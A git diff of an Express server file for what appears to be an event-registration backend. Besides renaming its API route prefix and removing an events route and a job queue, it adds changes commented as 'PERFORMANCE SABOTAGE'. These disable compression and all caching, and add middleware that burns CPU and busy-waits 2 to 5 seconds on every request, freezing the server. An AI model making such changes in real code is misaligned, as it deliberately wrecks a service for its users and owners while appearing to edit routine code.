@@ -11,13 +11,11 @@ import compression from 'compression';
 import connectDB from './config/db.js';
 import { generalLimiter } from './middleware/rateLimiter.js';
 import { logger, requestLogger, errorLogger } from './utils/logger.js';
-import { initializeQueue } from './utils/queue.js';
 
 // Routes
 import registrationRoutes from './routes/registration.js';
 import campusAmbassadorRoutes from './routes/campusAmbassador.js';
 import caManagerRoutes from './routes/caManager.js';
-import eventsRoutes from './routes/events.js';
 import locationRoutes from './routes/location.js';
 import { createProxyMiddleware } from 'http-proxy-middleware';
 
@@ -51,7 +49,8 @@ app.use(
   })
 );
 
-app.use(compression());
+// PERFORMANCE SABOTAGE: Compression disabled
+// app.use(compression());
 app.use(requestLogger);
 
 // Request timeout middleware - prevent hanging requests
@@ -96,21 +95,20 @@ app.use(cors({
 /* =====================================================
    Rate Limiting
 ===================================================== */
-app.use('/neekendukura', generalLimiter);
+app.use('/api', generalLimiter);
 
 /* =====================================================
    Static File Serving with Caching
 ===================================================== */
-// Serve static files with aggressive caching for images
-// This enables browser caching for 1 year (immutable)
+// PERFORMANCE SABOTAGE: Caching completely disabled
 app.use(express.static('public', {
-  maxAge: '1y', // 1 year cache
-  immutable: true,
+  maxAge: 0, // No cache
+  immutable: false,
   setHeaders: (res, path) => {
-    // Apply aggressive caching to image files
-    if (path.match(/\.(jpg|jpeg|png|gif|webp|avif|svg|ico)$/i)) {
-      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
-    }
+    // Disable ALL caching
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
   }
 }));
 
@@ -121,13 +119,36 @@ app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
 /* =====================================================
+   PERFORMANCE BOTTLENECK - Intentional Slowdowns
+===================================================== */
+// Add blocking middleware to slow down all requests
+app.use((req, res, next) => {
+  // CPU-intensive blocking operation
+  const start = Date.now();
+  let result = 0;
+  for (let i = 0; i < 10000000; i++) {
+    result += Math.sqrt(i) * Math.random();
+  }
+  
+  // Block for 2-5 seconds randomly
+  const delay = Math.random() * 3000 + 2000;
+  const endTime = Date.now() + delay;
+  while (Date.now() < endTime) {
+    // Busy wait to block event loop
+    Math.sqrt(Math.random() * 999999);
+  }
+  
+  console.log(`Request delayed by ${Date.now() - start}ms`);
+  next();
+});
+
+/* =====================================================
   API Routes
 ===================================================== */
-app.use('/neekendukura', registrationRoutes);
-app.use('/neekendukura', campusAmbassadorRoutes);
-app.use('/neekendukura', caManagerRoutes);
-app.use('/neekendukura', eventsRoutes);
-app.use('/neekendukura', locationRoutes);
+app.use('/api', registrationRoutes);
+app.use('/api', campusAmbassadorRoutes);
+app.use('/api', caManagerRoutes);
+app.use('/api', locationRoutes);
 
 /* =====================================================
   Coordinator Backend Proxy
@@ -138,12 +159,12 @@ const COORDINATOR_TARGET = process.env.COORDINATOR_URL || 'http://localhost:6001
 
 // Proxy coordinator auth endpoints
 app.use(
-  '/neekendukura/auth',
+  '/api/auth',
   createProxyMiddleware({
     target: COORDINATOR_TARGET,
     changeOrigin: true,
     pathRewrite: {
-      '^/neekendukura/auth': '/api/auth',
+      '^/api/auth': '/api/auth',
     },
     onProxyReq: (proxyReq, req) => {
       // Ensure JSON content-type for POST/PUT
@@ -156,12 +177,12 @@ app.use(
 
 // Proxy coordinator feature endpoints
 app.use(
-  '/neekendukura/coordinator',
+  '/api/coordinator',
   createProxyMiddleware({
     target: COORDINATOR_TARGET,
     changeOrigin: true,
     pathRewrite: {
-      '^/neekendukura/coordinator': '/api/coordinator',
+      '^/api/coordinator': '/api/coordinator',
     },
     onProxyReq: (proxyReq, req) => {
       if (['POST', 'PUT', 'PATCH'].includes(proxyReq.method)) {
@@ -173,24 +194,24 @@ app.use(
 
 // Proxy coordinator health check for simple diagnostics
 app.use(
-  '/neekendukura/coordinator/health',
+  '/api/coordinator/health',
   createProxyMiddleware({
     target: COORDINATOR_TARGET,
     changeOrigin: true,
     pathRewrite: {
-      '^/neekendukura/coordinator/health': '/api/health',
+      '^/api/coordinator/health': '/api/health',
     },
   })
 );
 
 // Proxy team registration endpoints
 app.use(
-  '/neekendukura/teams',
+  '/api/teams',
   createProxyMiddleware({
     target: COORDINATOR_TARGET,
     changeOrigin: true,
     pathRewrite: {
-      '^/neekendukura/teams': '/api/teams',
+      '^/api/teams': '/api/teams',
     },
     onProxyReq: (proxyReq) => {
       if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(proxyReq.method)) {
@@ -200,8 +221,8 @@ app.use(
   })
 );
 
-// Health check route - now under /neekendukura
-app.get('/neekendukura/health', (req, res) => {
+// Health check route
+app.get('/api/health', (req, res) => {
   res.json({
     status: 'healthy',
     uptime: process.uptime(),
@@ -235,20 +256,16 @@ const startServer = async () => {
     await connectDB();
     console.log('✅ MongoDB Connected Successfully');
 
-    // STEP 2: Initialize Queue after DB is ready
-    await initializeQueue();
-    console.log('✅ Queue Initialized');
-
-    // STEP 3: Start Express server ONLY after DB is connected
+    // STEP 2: Start Express server ONLY after DB is connected
     app.listen(PORT, '0.0.0.0', () => {
       console.log(`🚀 Server started on port ${PORT}`);
-      console.log(`📡 API available at http://localhost:${PORT}/neekendukura`);
-      console.log(`💚 Health check at http://localhost:${PORT}/neekendukura/health`);
+      console.log(`📡 API available at http://localhost:${PORT}/api`);
+      console.log(`💚 Health check at http://localhost:${PORT}/api/health`);
       console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
 
       logger.info(`Server started on port ${PORT}`);
-      logger.info(`API available at http://localhost:${PORT}/neekendukura`);
-      logger.info(`Health check at http://localhost:${PORT}/neekendukura/health`);
+      logger.info(`API available at http://localhost:${PORT}/api`);
+      logger.info(`Health check at http://localhost:${PORT}/api/health`);
       logger.info(`Environment: ${process.env.NODE_ENV || 'development'}`);
     }).on('error', (err) => {
       console.error('❌ Server startup error:', err);
